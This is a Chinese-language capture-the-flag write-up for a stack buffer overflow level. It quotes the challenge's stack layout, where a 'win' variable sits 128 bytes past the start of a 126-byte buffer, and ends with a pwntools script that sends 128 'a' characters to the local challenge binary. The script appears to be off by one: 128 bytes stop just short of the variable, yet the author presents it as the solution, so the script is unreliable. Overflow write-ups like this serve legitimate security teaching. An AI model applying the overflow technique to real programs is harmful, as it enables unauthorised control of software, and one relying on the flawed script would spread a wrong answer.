# 挑战简介
```
我们的堆栈指针指向 0x7ffe36f38810，基指针指向 0x7ffe36f388d0。
这意味着我们的堆栈框架中有（十进制）26 个 8 字节字，
包括保存的基指针和保存的返回地址，
总共 208 个字节。
输入缓冲区从 0x7ffe36f38840 开始，位于堆栈框架的中途，
（堆栈中“上方”是函数使用的其他局部变量）。
您的输入将被读入此缓冲区。
缓冲区长度为 126 字节，但程序会让您提供任意大的输入长度，从而溢出缓冲区。

在此级别中，有一个“win”变量。
默认情况下，此变量的值为零。
但是，当此变量非零时，将打印标志。
您可以通过溢出输入缓冲区使此变量非零。
“win”变量存储在 0x7ffe36f388c0，即输入缓冲区开始后 128 个字节。

我们已针对此挑战禁用以下标准内存损坏缓解措施：
- 二进制文件*不*与位置无关。这意味着每次运行时它都会位于同一位置，这意味着通过分析二进制文件（使用 objdump 或读取此输出），您可以知道需要用来覆盖返回地址的确切值。

您已选择发送 4096 字节的输入！
这将允许您从 0x7ffe36f38840（输入缓冲区的开始）写入（但不包括）0x7ffe36f39840（超出缓冲区末尾 3970 字节）。
发送您的有效载荷（最多 4096 字节）！
```

# 思路
这一章节的内容，都是有关于二进制的一些漏洞的，非常有帮助，难度适中，重在理解  

这一题，考的栈溢出，就是当你输入的数据大于缓冲区的数据时，则会使申请范围外的数据被改变，后果可能会轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。

win变量在128个字节后，直接脚本疯狂输出便是了(你可以自己手输'a'和'aa'观看回馈结果，就理解了)

pwntools脚本秒了

```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-var-control-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
p.send('a' * 128)
p.recvall()
```
